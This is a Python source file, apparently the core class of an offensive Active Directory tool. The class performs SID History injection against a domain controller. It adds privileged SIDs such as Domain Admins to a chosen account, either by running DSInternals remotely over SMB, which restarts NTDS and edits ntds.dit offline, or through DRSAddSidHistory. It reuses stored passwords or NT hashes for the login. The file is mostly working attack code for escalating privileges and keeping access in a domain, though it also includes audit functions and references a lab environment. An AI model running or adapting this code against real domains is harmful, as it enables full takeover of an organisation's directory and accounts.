"""
SID History Attack Implementation v2
Main orchestrator: wires up authentication, LDAP operations,
DRSUAPI calls, DSInternals injection, scanning, and output formatting.
"""

import logging
from typing import Optional, List, Dict, Any

from .auth import AuthenticationManager
from .ldap_operations import LDAPOperations
from .sid_utils import SIDConverter
from .output import OutputFormatter
from .scanner import DomainScanner, AuditReport


class SIDHistoryAttack:
    """
    Main class for performing SID History operations from a remote Linux host.

    Supports two injection methods:
    - dsinternals: Offline ntds.dit modification via DSInternals (can inject privileged SIDs)
    - drsuapi: DRSAddSidHistory opnum 20 (cross-forest only, v1 legacy)
    """

    def __init__(self, dc_ip: str, domain: str, dc_hostname: Optional[str] = None):
        self.dc_ip = dc_ip
        self.domain = domain
        self.dc_hostname = dc_hostname or dc_ip

        self.auth_manager = AuthenticationManager(dc_ip, domain, dc_hostname)
        self.connection = None
        self.ldap_ops = None
        self.drsuapi_client = None
        self.base_dn = SIDConverter.domain_to_dn(domain)
        self.domain_sid = None

        self._formatter = OutputFormatter()
        self._scanner = None

        logging.debug(f"Initialized targeting {dc_ip} ({domain})")

    # ─── CONNECTION MANAGEMENT ────────────────────────────────────────

    def authenticate(self, auth_method: str, **kwargs) -> bool:
        """Authenticate to the domain controller via LDAP."""
        self.connection = self.auth_manager.get_connection(auth_method, **kwargs)

        if self.connection:
            self.ldap_ops = LDAPOperations(self.connection, self.base_dn)
            self._scanner = DomainScanner(self.ldap_ops, self.domain)

            # Try to discover domain SID
            self.domain_sid = self.ldap_ops.get_domain_sid()
            if self.domain_sid:
                logging.debug(f"Domain SID: {self.domain_sid}")

            logging.debug(f"Successfully authenticated to {self.dc_ip}")
            return True
        else:
            logging.error("Authentication failed")
            return False

    def connect_drsuapi(self, username: str = None, password: str = '',
                        lm_hash: str = '', nt_hash: str = '',
                        do_kerberos: bool = False) -> bool:
        """
        Establish a DRSUAPI RPC connection for DRSAddSidHistory.
        Uses stored credentials from LDAP auth if not provided.
        """
        try:
            from .methods.drsuapi import DRSUAPIClient
        except ImportError as e:
            logging.error(f"DRSUAPI module unavailable: {e}")
            return False

        self.drsuapi_client = DRSUAPIClient(self.dc_ip, self.domain, self.dc_hostname)

        # Use stored credentials if not provided
        if not username:
            username = self.auth_manager._username or ''
            password = self.auth_manager._password or ''
            lm_hash = self.auth_manager._lm_hash or ''
            nt_hash = self.auth_manager._nt_hash or ''
            do_kerberos = self.auth_manager._do_kerberos

        success = self.drsuapi_client.connect(
            username=username,
            password=password,
            domain=self.domain,
            lm_hash=lm_hash,
            nt_hash=nt_hash,
            do_kerberos=do_kerberos
        )

        if success:
            logging.debug("DRSUAPI connection established")
        else:
            logging.error("Failed to establish DRSUAPI connection")
            self.drsuapi_client = None

        return success

    def disconnect(self):
        """Close all connections."""
        if self.connection:
            try:
                self.connection.unbind()
                logging.debug("LDAP disconnected")
            except Exception:
                pass
            finally:
                self.connection = None
                self.ldap_ops = None

        if self.drsuapi_client:
            self.drsuapi_client.disconnect()
            self.drsuapi_client = None

    # ─── SID LOOKUPS ──────────────────────────────────────────────────

    def get_user_sid(self, sam_account_name: str) -> Optional[str]:
        """Get the SID of any AD object by sAMAccountName."""
        if not self.ldap_ops:
            logging.error("Not connected")
            return None
        return self.ldap_ops.get_object_sid(sam_account_name)

    def get_current_sid_history(self, sam_account_name: str) -> List[str]:
        """Get the current sIDHistory of an object."""
        if not self.ldap_ops:
            logging.error("Not connected")
            return []
        return self.ldap_ops.get_sid_history(sam_account_name)

    def get_domain_sid(self) -> Optional[str]:
        """Get the domain SID."""
        return self.domain_sid

    # ─── SID RESOLUTION FOR INJECTION ─────────────────────────────────

    def resolve_inject_sid(self, inject_value: str,
                           inject_domain: Optional[str] = None) -> Optional[str]:
        """
        Resolve an --inject value to a concrete SID.

        Args:
            inject_value: Either a preset name (e.g. 'domain-admins') or a raw SID string
            inject_domain: Optional foreign domain FQDN. If provided, resolve the
                          domain SID of that domain via LDAP trusts.

        Returns:
            Resolved SID string, or None on failure
        """
        # Case 1: Raw SID string provided directly
        if SIDConverter.is_valid_sid(inject_value):
            logging.debug(f"Using raw SID: {inject_value}")
            return inject_value

        # Case 2: Preset name — need a domain SID to build it
        preset_lower = inject_value.lower()
        from .sid_utils import PRIVILEGED_PRESETS
        if preset_lower not in PRIVILEGED_PRESETS:
            logging.error(f"Unknown preset or invalid SID: {inject_value}")
            logging.error(f"Available presets: {', '.join(sorted(PRIVILEGED_PRESETS.keys()))}")
            return None

        # Determine which domain SID to use
        if inject_domain:
            target_domain_sid = self._resolve_foreign_domain_sid(inject_domain)
            if not target_domain_sid:
                logging.error(f"Could not resolve domain SID for {inject_domain}")
                return None
        else:
            target_domain_sid = self.domain_sid
            if not target_domain_sid:
                logging.error("Domain SID not available")
                return None

        resolved = SIDConverter.resolve_preset(preset_lower, target_domain_sid)
        if resolved:
            name = PRIVILEGED_PRESETS.get(preset_lower, preset_lower)
            logging.debug(f"Resolved preset '{inject_value}' -> {resolved}")
        return resolved

    def _resolve_foreign_domain_sid(self, foreign_domain: str) -> Optional[str]:
        """
        Resolve the SID of a foreign domain via trust enumeration.

        Looks up the trustedDomain objects in LDAP to find the SID
        of the specified domain.
        """
        if not self.ldap_ops:
            logging.error("Not connected — cannot resolve foreign domain SID")
            return None

        trusts = self.ldap_ops.enumerate_trusts()
        foreign_lower = foreign_domain.lower()

        for trust in trusts:
            trust_partner = trust.get('partner', '').lower()
            trust_flat = trust.get('flatName', '').lower()

            if trust_partner == foreign_lower or trust_flat == foreign_lower:
                trust_sid = trust.get('sid', '')
                if trust_sid:
                    logging.debug(f"Resolved {foreign_domain} SID via trust: {trust_sid}")
                    return trust_sid

        logging.error(f"No trust found for domain '{foreign_domain}'")
        logging.error("Available trusts:")
        for trust in trusts:
            logging.error(f"  - {trust.get('name', 'unknown')} (SID: {trust.get('sid', 'N/A')})")
        return None

    # ─── SID HISTORY INJECTION (DSInternals) ──────────────────────────

    def inject_sid_history_dsinternals(self, target_user: str, sid_to_inject: str,
                                       dsinternals_path: Optional[str] = None) -> bool:
        """
        Inject a SID into the target's sIDHistory using DSInternals
        executed remotely via impacket SCMR.

        Args:
            target_user: sAMAccountName of target
            sid_to_inject: Full SID string to inject
            dsinternals_path: Optional local path to DSInternals module on the DC
        """
        from .methods.dsinternals import DSInternalsInjector

        injector = DSInternalsInjector(
            dc_ip=self.dc_ip,
            domain=self.domain,
            username=self.auth_manager._username or '',
            password=self.auth_manager._password or '',
            lm_hash=self.auth_manager._lm_hash or '',
            nt_hash=self.auth_manager._nt_hash or '',
            dsinternals_path=dsinternals_path,
        )

        try:
            print("[*] Connecting to DC via SMB...")
            success, message = injector.inject(target_user, sid_to_inject)
            if success:
                print("[+] DSInternals injection succeeded")
                logging.debug(f"Result: {message}")
            else:
                print(f"[-] DSInternals injection failed: {message}")
            return success
        finally:
            injector.disconnect()

    # ─── SID HISTORY INJECTION (DRSUAPI) ──────────────────────────────

    def inject_sid_history_drsuapi(self, target_user: str, source_user: str,
                                   source_domain: Optional[str] = None,
                                   src_creds_user: str = '',
                                   src_creds_domain: str = '',
                                   src_creds_password: str = '') -> bool:
        """
        Inject the SID of a source user into the target's sIDHistory
        via DRSUAPI DRSAddSidHistory (opnum 20).
        """
        if not self.drsuapi_client:
            logging.debug("Establishing DRSUAPI connection...")
            if not self.connect_drsuapi():
                logging.error("Cannot connect to DRSUAPI")
                return False

        src_domain = source_domain or self.domain
        dst_domain = self.domain

        logging.debug(f"DRSAddSidHistory: {source_user}@{src_domain} -> {target_user}@{dst_domain}")

        success, error_code, error_msg = self.drsuapi_client.add_sid_history(
            src_domain=src_domain,
            src_principal=source_user,
            dst_domain=dst_domain,
            dst_principal=target_user,
            src_creds_user=src_creds_user,
            src_creds_domain=src_creds_domain,
            src_creds_password=src_creds_password,
        )

        if success:
            logging.debug("DRSAddSidHistory RPC call succeeded!")
        else:
            logging.error(f"DRSAddSidHistory failed: {error_msg}")
            self._suggest_drsuapi_fix(error_code)

        return success

    def _reconnect_ldap(self, retries: int = 6, delay: int = 5) -> bool:
        """Reconnect LDAP after DSInternals injection (NTDS restart breaks the connection)."""
        import time

        if self.connection:
            try:
                self.connection.unbind()
            except Exception:
                pass
            self.connection = None

        # Suppress auth retry noise during reconnection
        prev_level = logging.getLogger().level
        logging.getLogger().setLevel(logging.CRITICAL)

        for attempt in range(retries):
            time.sleep(delay)
            try:
                self.connection = self.auth_manager.get_connection(
                    self.auth_manager._last_auth_method,
                    **self.auth_manager._last_auth_params
                )
                if self.connection:
                    self.ldap_ops = LDAPOperations(self.connection, self.base_dn)
                    self._scanner = DomainScanner(self.ldap_ops, self.domain)
                    logging.getLogger().setLevel(prev_level)
                    logging.debug("LDAP reconnected after NTDS restart")
                    return True
            except Exception:
                pass

        logging.getLogger().setLevel(prev_level)
        logging.debug("LDAP reconnection failed after all retries")
        return False

    def inject_sid_history(self, target_user: str,
                           method: str = 'dsinternals',
                           # DSInternals params
                           inject_value: Optional[str] = None,
                           inject_domain: Optional[str] = None,
                           dsinternals_path: Optional[str] = None,
                           # DRSUAPI params
                           source_user: Optional[str] = None,
                           source_domain: Optional[str] = None,
                           src_creds_user: str = '',
                           src_creds_domain: str = '',
                           src_creds_password: str = '') -> bool:
        """
        Dispatch SID History injection to the appropriate method.

        Args:
            target_user: sAMAccountName of target
            method: 'dsinternals' or 'drsuapi'
            inject_value: Preset name or raw SID (for dsinternals)
            inject_domain: Foreign domain for preset resolution (for dsinternals)
            dsinternals_path: Path to DSInternals on the DC (for dsinternals)
            source_user: Source user sAMAccountName (for drsuapi)
            source_domain: Source domain FQDN (for drsuapi)
            src_creds_*: Source domain credentials (for drsuapi)
        """
        if method == 'dsinternals':
            if not inject_value:
                logging.error("--inject is required for dsinternals method")
                return False

            sid_to_inject = self.resolve_inject_sid(inject_value, inject_domain)
            if not sid_to_inject:
                return False

            sid_name = SIDConverter.resolve_sid_name(sid_to_inject)
            print(f"\n[*] Injection target: {target_user}")
            print(f"[*] SID to inject:   {sid_to_inject} ({sid_name})")
            print(f"[*] Method:          DSInternals (offline ntds.dit)")
            if inject_domain:
                print(f"[*] Source domain:   {inject_domain}")
            print(f"[*] DC:              {self.dc_ip}")
            print()

            success = self.inject_sid_history_dsinternals(
                target_user, sid_to_inject, dsinternals_path
            )

            # Reconnect LDAP (NTDS restart broke the connection)
            if success:
                print("[*] Waiting for NTDS to restart...")
                self._reconnect_ldap()

            return success

        elif method == 'drsuapi':
            return self.inject_sid_history_drsuapi(
                target_user, source_user,
                source_domain=source_domain,
                src_creds_user=src_creds_user,
                src_creds_domain=src_creds_domain,
                src_creds_password=src_creds_password,
            )

        else:
            logging.error(f"Unknown injection method: {method}")
            return False

    # ─── SCANNING & AUDITING ──────────────────────────────────────────

    def full_audit(self) -> Optional[AuditReport]:
        """Perform a full domain-wide sIDHistory audit."""
        if not self._scanner:
            logging.error("Not connected")
            return None
        return self._scanner.full_audit()

    def scan_user(self, sam_account_name: str):
        """Scan a single object for sIDHistory issues."""
        if not self._scanner:
            logging.error("Not connected")
            return None
        return self._scanner.scan_user(sam_account_name)

    def enumerate_trusts(self) -> List[Dict]:
        """Enumerate domain trusts."""
        if not self.ldap_ops:
            logging.error("Not connected")
            return []
        return self.ldap_ops.enumerate_trusts()

    # ─── HELPERS ──────────────────────────────────────────────────────

    @staticmethod
    def _suggest_drsuapi_fix(error_code: int):
        """Suggest fixes for common DRSUAPI errors."""
        suggestions = {
            5: "Ensure you have Domain Admin privileges in the destination domain",
            8521: "Enable 'Audit account management' (Success+Failure) on the source domain DC.\n"
                  "  On the source DC, run: auditpol /set /category:\"Account Management\" /success:enable /failure:enable",
            8534: "Source and destination are in the same forest.\n"
                  "  DRSAddSidHistory (flags=0) only works cross-forest.\n"
                  "  For same-forest child→parent, use a source in a different forest\n"
                  "  (e.g., essos.local → north.sevenkingdoms.local in GOAD)",
            8536: "Enable 'Audit account management' (Success+Failure) on the destination domain DC.\n"
                  "  On the destination DC, run: auditpol /set /category:\"Account Management\" /success:enable /failure:enable\n"
                  "  Also enable it on the source DC if not already done",
            8547: "You must connect to the DC that holds the destination domain NC",
            8490: "Cross-forest variant requires source and destination in different forests.",
            8447: "Enable auditing: 'Audit account management' must be set to Success/Failure\n"
                  "  in both source and destination domain GPOs",
            8548: "Source DC could not be reached. Ensure:\n"
                  "  - Source DC hostname resolves correctly\n"
                  "  - TcpipClientSupport=1 is set in source DC registry\n"
                  "  - Source DC is the PDC/PDC Emulator",
            1355: "Source domain not found. Check DNS and trust configuration",
        }

        if error_code in suggestions:
            logging.error(f"Suggestion: {suggestions[error_code]}")
